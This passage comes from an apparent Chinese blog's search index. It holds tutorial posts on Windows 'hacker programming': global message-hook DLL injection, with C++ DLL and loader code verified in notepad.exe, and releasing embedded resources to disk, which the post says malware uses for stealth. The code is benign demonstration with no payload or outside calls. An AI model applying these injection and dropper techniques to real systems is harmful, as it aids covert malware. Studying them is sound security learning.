class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-comment">//共享内存</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> data_seg(<span class="hljs-meta-string">&quot;mydata&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> data_seg()</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/SECTION:mydata,RWS&quot;</span>)</span><br>HMODULE g_hDllModule = <span class="hljs-literal">NULL</span>;<br>HHOOK g_hHook = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">// 钩子回调函数</span><br><span class="hljs-function">LRESULT <span class="hljs-title">GetMsgProc</span><span class="hljs-params">(<span class="hljs-keyword">int</span> code, WPARAM wParam, LPARAM lParam)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">CallNextHookEx</span>(g_hHook, code, wParam, lParam);<br>&#125;<br><span class="hljs-comment">// 设置全局钩子</span><br><span class="hljs-function">BOOL <span class="hljs-title">SetGlobalHook</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    g_hHook = <span class="hljs-built_in">SetWindowsHookEx</span>(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_hDllModule, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == g_hHook)<br>    &#123;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-comment">// 卸载钩子</span><br><span class="hljs-function">BOOL <span class="hljs-title">UnsetGlobalHook</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (g_hHook)<br>    &#123;<br>        <span class="hljs-built_in">UnhookWindowsHookEx</span>(g_hHook);<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    &#123;<br>        g_hDllModule = hModule;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>全局钩子是以DLL形式加载到其他进程空间之中的，且进程都是独立的，任意修改其中的一个内存里的数据是不会影响另一个进程的。所在DLL中创建了共享内存，共享内存是指突破进程独立性，多个进程共享同一段内存。在DLL中创建共享内存，就是在DLL之中创建一个变量，然后将DLL加载到多个进程空间，只要一个进程修改了该变量值，其他进程DLL中的这个值也会改变，就相当于多个进程共享一个内存。</p><p>编写一个调用DLL的程序，test.exe</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// test.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(*typedef_SetGlobalHook)</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(*typedef_UnsetGlobalHook)</span><span class="hljs-params">()</span></span>;<br>HMODULE hDll = <span class="hljs-literal">NULL</span>;<br>typedef_SetGlobalHook SetGlobalHook = <span class="hljs-literal">NULL</span>;<br>typedef_UnsetGlobalHook UnsetGlobalHook = <span class="hljs-literal">NULL</span>;<br>BOOL bRet = FALSE;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;按下回车开始设置钩子\n&quot;</span>);<br><span class="hljs-built_in">getchar</span>();<br><span class="hljs-keyword">do</span><br>&#123;<br>hDll = <span class="hljs-built_in">LoadLibrary</span>(<span class="hljs-string">L&quot;Hook.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == hDll)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加载DLL失败\n错误代码%d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-keyword">break</span>;<br>&#125;<br>SetGlobalHook = (typedef_SetGlobalHook)<span class="hljs-built_in">GetProcAddress</span>(hDll, <span class="hljs-string">&quot;SetGlobalHook&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == SetGlobalHook)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取函数地址失败\n错误代码%d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-keyword">break</span>;<br>&#125;<br>bRet = <span class="hljs-built_in">SetGlobalHook</span>();<br><span class="hljs-keyword">if</span> (bRet)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;设置钩子成功\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;设置钩子失败\n&quot;</span>);<br>&#125;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>UnsetGlobalHook = (typedef_UnsetGlobalHook)<span class="hljs-built_in">GetProcAddress</span>(hDll, <span class="hljs-string">&quot;UnsetGlobalHook&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == UnsetGlobalHook)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取函数地址失败\n错误代码%d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-built_in">UnsetGlobalHook</span>();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;卸载钩子成功\n&quot;</span>);<br>&#125; <span class="hljs-keyword">while</span> (FALSE);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="效果查看"><a href="#效果查看" class="headerlink" title="效果查看"></a>效果查看</h4><p>可以先试用PC hunter工具进行查看，可以看到当前没有任何消息钩子存在。</p><p><img src="/2021/07/08/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/1.png"></p><p>打开我们的test.exe，设置好钩子之后，再进行查看，刷新一下消息钩子列表，如图可以看到已经存在了一个消息钩子。</p><p><img src="/2021/07/08/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/2.png"></p><p>使用OD附加打开notepad.exe，再打开模块窗口。</p><p><img src="/2021/07/08/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/3.png"></p><p>再打开test.exe，进行钩子设置。可以很明显看到变化，已经注入成功了。</p><p><img src="/2021/07/08/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/4.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>注入</tag>
      
      <tag>HOOK</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>资源释放</title>
    <link href="/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/"/>
    <url>/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="资源释放"><a href="#资源释放" class="headerlink" title="资源释放"></a>资源释放</h2><p>恶意代码会广泛的使用此技术，因为它可以使程序变得简洁，提高隐蔽性。如果一个程序需要额外的加载一些DLL、文本文件或者其他类型文件，将它们可以作为资源插入到程序中，在程序运行的时候再将它们释放到本地上，这样恶意代码会更加隐蔽。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="FindResource函数，确定具有指定类型和名称的资源在指定模块中的位置"><a href="#FindResource函数，确定具有指定类型和名称的资源在指定模块中的位置" class="headerlink" title="FindResource函数，确定具有指定类型和名称的资源在指定模块中的位置"></a>FindResource函数，确定具有指定类型和名称的资源在指定模块中的位置</h5><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">HRSRC FindResourceW(<br>  HMODULE hModule,<br>  LPCWSTR lpName,<br>  LPCWSTR lpType<br>);<br></code></pre></div></td></tr></table></figure><p>hModule：处理包含资源的可执行文件模块。若hModule为NULL，则系统从当前进程的模块中装载资源。</p><p>lpName：指定资源名称</p><p>lpType：指定资源类型</p><p>返回值：如果函数运行成功，那么返回值为指定资源信息块的句柄。可将这个句柄传递给其它函数获取其他信息。如果失败，则返回NULL；</p><h5 id="SizeofResource函数：获取指定资源的字节数"><a href="#SizeofResource函数：获取指定资源的字节数" class="headerlink" title="SizeofResource函数：获取指定资源的字节数"></a>SizeofResource函数：获取指定资源的字节数</h5><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">DWORD SizeofResource(<br>  HMODULE hModule,<br>  HRSRC   hResInfo<br>);<br></code></pre></div></td></tr></table></figure><p>hModule：包含资源的可执行文件模块的句柄。若hModule为NULL，则系统从当前进程的模块中装载资源。</p><p>hResInfo：资源局部。此句柄必须由函数FindResource或FindResourceEx来出创建。</p><p>返回值：如果函数运行成功，则返回值为资源的字节数；如果函数运行失败，则返回值为0；</p><h5 id="LoadResource函数：装载指定资源到全局存储器"><a href="#LoadResource函数：装载指定资源到全局存储器" class="headerlink" title="LoadResource函数：装载指定资源到全局存储器"></a>LoadResource函数：装载指定资源到全局存储器</h5><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">HGLOBAL LoadResource(<br>  HMODULE hModule,<br>  HRSRC   hResInfo<br>);<br></code></pre></div></td></tr></table></figure><p>hModule：包含资源的可执行文件模块的句柄。若hModule为NULL，则系统从当前进程的模块中装载资源。</p><p>hResInfo：资源局部。此句柄必须由函数FindResource或FindResourceEx来出创建。</p><p>返回值：如果函数运行成功，则返回值为相关资源数据的句柄。如果函数运行失败，则返回值为NULL。</p><h5 id="LockResource函数：锁定资源并得到资源在内存中的第一个字节的指针"><a href="#LockResource函数：锁定资源并得到资源在内存中的第一个字节的指针" class="headerlink" title="LockResource函数：锁定资源并得到资源在内存中的第一个字节的指针"></a>LockResource函数：锁定资源并得到资源在内存中的第一个字节的指针</h5><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">LPVOID LockResource(<br>  HGLOBAL hResData<br>);<br></code></pre></div></td></tr></table></figure><p>hResData：装载资源的句柄。函数LoadResource可以返回这个句柄。</p><p>返回值：如果装载资源被锁住，则返回值是资源的第一个字节的指针；反之则为NULL。</p><h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><p>创建一个test.txt文件，写入内容</p><p><img src="/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/1.png"></p><p>在程序中添加一个自定义资源，自定义资源名称为“MYRES”，再将刚才创建的txt文件添加进去</p><p>程序实现源代码</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// FreeRes.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;resource.h&quot;</span></span><br><span class="hljs-comment">//资源控件名称，资源名称，释放后的名称</span><br><span class="hljs-function">BOOL <span class="hljs-title">FreeRes</span><span class="hljs-params">(UINT uiResourceName,TCHAR* lpszResType,<span class="hljs-keyword">char</span>* lpszSaveFileName)</span> </span>&#123;<br>    <span class="hljs-comment">//获取指定模块的资源</span><br>    HRSRC hRes = <span class="hljs-built_in">FindResource</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">MAKEINTRESOURCE</span>(uiResourceName), lpszResType);<br>    <span class="hljs-keyword">if</span> (hRes == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;获取资源失败&quot;</span>, <span class="hljs-string">L&quot;&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//获取大小</span><br>    DWORD dwSize = <span class="hljs-built_in">SizeofResource</span>(<span class="hljs-literal">NULL</span>, hRes);<br>    <span class="hljs-keyword">if</span> (dwSize == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;获取字节数失败&quot;</span>, <span class="hljs-string">L&quot;&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//装载资源</span><br>    HGLOBAL hGlobal = <span class="hljs-built_in">LoadResource</span>(<span class="hljs-literal">NULL</span>, hRes);<br>    <span class="hljs-keyword">if</span> (hGlobal == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;装载资源失败&quot;</span>, <span class="hljs-string">L&quot;&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//锁定资源</span><br>    LPVOID lPvoid = <span class="hljs-built_in">LockResource</span>(hGlobal);<br>    <span class="hljs-keyword">if</span>(lPvoid == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;锁定资源失败&quot;</span>, <span class="hljs-string">L&quot;&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//开始释放资源</span><br>    FILE* fp;<br>    <span class="hljs-built_in">fopen_s</span>(&amp;fp, lpszSaveFileName, <span class="hljs-string">&quot;wb+&quot;</span>);<span class="hljs-comment">//wb+读写打开或建立一个二进制文件，允许读和写</span><br>    <span class="hljs-keyword">if</span> (fp == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;写入资源失败&quot;</span>, <span class="hljs-string">L&quot;&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-built_in">fwrite</span>(lPvoid, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-keyword">char</span>), dwSize, fp);<br>    <span class="hljs-built_in">fclose</span>(fp);<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;按下回车键开始释放资源\n&quot;</span>);<br>    <span class="hljs-built_in">getchar</span>();<br>    BOOL FLAG=<span class="hljs-built_in">FreeRes</span>(IDR_MYRES2,<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;MYRES&quot;</span>),<span class="hljs-string">&quot;free.txt&quot;</span>);<br>    <span class="hljs-keyword">if</span> (FLAG == TRUE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;释放成功\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;释放失败\n&quot;</span>);<br>    <span class="hljs-built_in">getchar</span>();<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/2.png"></p><p>查看free.txt内容</p><p><img src="/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/3.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>写在前面的话</title>
    <link href="/2021/07/08/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2%E7%9A%84%E8%AF%9D/"/>
    <url>/2021/07/08/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2%E7%9A%84%E8%AF%9D/</url>
    
    <content type="html"><![CDATA[<p>一直都在说要写博客，但是一直都没有很好的坚持下来，上次写博客还是大二的时候，这都过去好久了。</p><p>现在自己也搭建了一个博客，希望能够好好坚持下去吧，作为日常的学习记录，也希望能够写出一些有价值的东西。</p><p>最后的最后，我是不知名小团队satter的b1ackie。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
